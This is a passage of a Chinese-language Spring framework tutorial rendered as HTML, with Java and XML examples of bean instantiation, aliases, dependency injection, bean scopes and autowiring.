class="hljs-name">constructor-arg</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="什么时候实例化"><a href="#什么时候实例化" class="headerlink" title="什么时候实例化"></a>什么时候实例化</h3><div class="code-wrapper"><pre><code class="hljs csharp">package com.zero.pojo;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">spider</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">spider</span>()</span>&#123;        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;i am spider&quot;</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs csharp">package com.zero.pojo;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">black</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">black</span>()</span>&#123;        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;i am black&quot;</span>);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;black&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.black&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;spider&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.spider&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.zero.Dao.UserOracleImpl;<span class="hljs-keyword">import</span> com.zero.person;<span class="hljs-keyword">import</span> com.zero.pojo.<span class="hljs-keyword">User</span>;<span class="hljs-keyword">import</span> com.zero.service.UserService;<span class="hljs-keyword">import</span> com.zero.service.UserServiceImpl;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">execute</span> &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;        ApplicationContext classPathXmlApplicationContext = <span class="hljs-built_in">new</span> ClassPathXmlApplicationContext(&quot;bean.xml&quot;);        <span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span> = (<span class="hljs-keyword">User</span>) classPathXmlApplicationContext.getBean(&quot;user&quot;);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">user</span>.toString());    &#125;&#125;</code></pre></div><p>并没有getBean获取black和spider，但却输出了</p><p><img src="/../images/Spring/image-20240119175116860.png" alt="image-20240119175116860"></p><p>说明spring在读取beans.xml的时候就实例化了所有beans.xml中注册的类</p><h2 id="spring配置"><a href="#spring配置" class="headerlink" title="spring配置"></a>spring配置</h2><h3 id="别名-alias"><a href="#别名-alias" class="headerlink" title="别名 alias"></a>别名 alias</h3><div class="code-wrapper"><pre><code class="hljs abnf">&lt;bean id<span class="hljs-operator">=</span><span class="hljs-string">&quot;user&quot;</span> class<span class="hljs-operator">=</span><span class="hljs-string">&quot;com.zero.pojo.User&quot;</span>&gt;&lt;constructor-arg name<span class="hljs-operator">=</span><span class="hljs-string">&quot;user&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;zeropeach&quot;</span>&gt;&lt;/constructor-arg&gt;&lt;/bean&gt;&lt;alias name<span class="hljs-operator">=</span><span class="hljs-string">&quot;user&quot;</span> alias<span class="hljs-operator">=</span><span class="hljs-string">&quot;user2&quot;</span>&gt;&lt;/alias&gt;</code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql">ApplicationContext classPathXmlApplicationContext = <span class="hljs-built_in">new</span> ClassPathXmlApplicationContext(&quot;bean.xml&quot;);<span class="hljs-keyword">User</span> <span class="hljs-keyword">user</span> = (<span class="hljs-keyword">User</span>) classPathXmlApplicationContext.getBean(&quot;user2&quot;);<span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">user</span>.toString());</code></pre></div><h3 id="bean"><a href="#bean" class="headerlink" title="bean"></a>bean</h3><p>bean中本身就有name属性，更加高级，可以用空格、逗号、分号、</p><div class="code-wrapper"><pre><code class="hljs abnf">&lt;bean id<span class="hljs-operator">=</span><span class="hljs-string">&quot;user&quot;</span> class<span class="hljs-operator">=</span><span class="hljs-string">&quot;com.zero.pojo.User&quot;</span> name<span class="hljs-operator">=</span><span class="hljs-string">&quot;user2 user3,user4;user5&quot;</span>&gt;&lt;constructor-arg name<span class="hljs-operator">=</span><span class="hljs-string">&quot;user&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;zeropeach&quot;</span>&gt;&lt;/constructor-arg&gt;&lt;/bean&gt;</code></pre></div><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">import</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;bean.xml&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">import</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p><img src="/../images/Spring/image-20240119181310885.png" alt="image-20240119181310885"></p><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><h3 id="构造器注入"><a href="#构造器注入" class="headerlink" title="构造器注入"></a>构造器注入</h3><h3 id="set方式注入"><a href="#set方式注入" class="headerlink" title="set方式注入"></a>set方式注入</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;address&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Address&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;address&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;广州&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;student&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Student&quot;</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;address&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;address&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;books&quot;</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>西游记<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>三国演义<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>水浒传<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>红楼梦<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span>       <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;card&quot;</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;aa&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;aaaaaaa&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;bb&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;bbb&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;cc&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;acccaaa&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;dd&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span>       <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;games&quot;</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>LOL<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>BOB<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>COC<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span>       <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hobbys&quot;</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>听歌<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>代码<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>电影<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>       <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;wife&quot;</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">null</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">null</span>&gt;</span>       <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>           <span class="hljs-tag">&lt;<span class="hljs-name">props</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;银行卡&quot;</span>&gt;</span>1231231231223123<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>               <span class="hljs-tag">&lt;<span class="hljs-name">prop</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;学号&quot;</span>&gt;</span>12312312312<span class="hljs-tag">&lt;/<span class="hljs-name">prop</span>&gt;</span>           <span class="hljs-tag">&lt;/<span class="hljs-name">props</span>&gt;</span>       <span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><h3 id="命名空间注入"><a href="#命名空间注入" class="headerlink" title="命名空间注入"></a>命名空间注入</h3><div class="code-wrapper"><pre><code class="hljs dts"><span class="hljs-comment">//在beans中加入命名空间</span><span class="hljs-symbol"></span><span class="hljs-symbol">xmlns:</span>p=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span><span class="hljs-symbol">xmlns:</span>c=<span class="hljs-string">&quot;http://www.springframework.org/schema/c&quot;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:c</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/c&quot;</span></span><span class="hljs-tag">      <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!--properties--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span> <span class="hljs-attr">p:name</span>=<span class="hljs-string">&quot;zeropeach&quot;</span> <span class="hljs-attr">p:age</span>=<span class="hljs-string">&quot;19&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!--constructor-arg--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span> <span class="hljs-attr">c:name</span>=<span class="hljs-string">&quot;zeropeach1&quot;</span> <span class="hljs-attr">c:age</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p><img src="/../images/Spring/image-20240119201126971.png" alt="image-20240119201126971"></p><p><img src="/../images/Spring/image-20240119201154474.png" alt="image-20240119201154474"></p><h3 id="bean的作用域"><a href="#bean的作用域" class="headerlink" title="bean的作用域"></a>bean的作用域</h3><ol><li>单例模式</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span> <span class="hljs-attr">p:name</span>=<span class="hljs-string">&quot;zeropeach&quot;</span> <span class="hljs-attr">p:age</span>=<span class="hljs-string">&quot;19&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;singleton&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><ol start="2"><li>原型模式：每次从容器中getBean的时候都会产生一个新对象</li></ol><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span> <span class="hljs-attr">c:name</span>=<span class="hljs-string">&quot;zeropeach1&quot;</span> <span class="hljs-attr">c:age</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;prototype&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:c</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/c&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><span class="hljs-string"><span class="hljs-tag">        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--单例模式--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span> <span class="hljs-attr">p:name</span>=<span class="hljs-string">&quot;zeropeach&quot;</span> <span class="hljs-attr">p:age</span>=<span class="hljs-string">&quot;19&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;singleton&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-comment">&lt;!--原型模式--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;user1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.User&quot;</span> <span class="hljs-attr">c:name</span>=<span class="hljs-string">&quot;zeropeach1&quot;</span> <span class="hljs-attr">c:age</span>=<span class="hljs-string">&quot;20&quot;</span> <span class="hljs-attr">scope</span>=<span class="hljs-string">&quot;prototype&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> com.zero.pojo.Student;<span class="hljs-keyword">import</span> com.zero.pojo.<span class="hljs-keyword">User</span>;<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> exec &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) &#123;        ApplicationContext context = <span class="hljs-built_in">new</span> ClassPathXmlApplicationContext(&quot;beans.xml&quot;);        <span class="hljs-keyword">User</span> student = (<span class="hljs-keyword">User</span>) context.getBean(&quot;user&quot;);        <span class="hljs-keyword">User</span> student1 = (<span class="hljs-keyword">User</span>) context.getBean(&quot;user&quot;);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(student.hashCode());        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(student1.hashCode());        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(student==student1);        <span class="hljs-keyword">User</span> user1 = (<span class="hljs-keyword">User</span>) context.getBean(&quot;user1&quot;);        <span class="hljs-keyword">User</span> user2 = (<span class="hljs-keyword">User</span>) context.getBean(&quot;user1&quot;);        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(user1.hashCode());        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(user2.hashCode());        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(user1==user2);    &#125;&#125;</code></pre></div><p><img src="/../images/Spring/image-20240120005112058.png" alt="image-20240120005112058"></p><ol start="3"><li>其他的在web服务中用</li></ol><h2 id="bean的自动装配"><a href="#bean的自动装配" class="headerlink" title="bean的自动装配"></a>bean的自动装配</h2><div class="code-wrapper"><pre><code class="hljs typescript">package com.<span class="hljs-property">zero</span>.<span class="hljs-property">pojo</span>;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span> &#123;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Dog</span> dog;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Cat</span> cat;    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;people&#123;&quot;</span> +                <span class="hljs-string">&quot;dog=&quot;</span> + dog +                <span class="hljs-string">&quot;, cat=&quot;</span> + cat +                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +                <span class="hljs-string">&#x27;&#125;&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Dog</span> <span class="hljs-title function_">getDog</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> dog;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setDog</span>(<span class="hljs-params">Dog dog</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">dog</span> = dog;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Cat</span> <span class="hljs-title function_">getCat</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> cat;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setCat</span>(<span class="hljs-params">Cat cat</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">cat</span> = cat;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> name;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setName</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> name</span>) &#123;        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;    &#125;&#125;</code></pre></div><h3 id="ByName自动装配"><a href="#ByName自动装配" class="headerlink" title="ByName自动装配"></a>ByName自动装配</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--自动在容器上下文中查找，和自己对象set方法后面的值对应的beanid--&gt;</span><span class="hljs-comment">&lt;!--并且id要是小写--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dog&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Dog&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Cat&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.people&quot;</span> <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byName&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;zeropeach&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></code></pre></div><h3 id="ByType自动装配"><a href="#ByType自动装配" class="headerlink" title="ByType自动装配"></a>ByType自动装配</h3><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Dog&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.Cat&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-comment">&lt;!--自动寻找相同的class--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;people1&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.zero.pojo.people&quot;</span> <span class="hljs-attr">autowire</span>=<span class="hljs-string">&quot;byType&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span 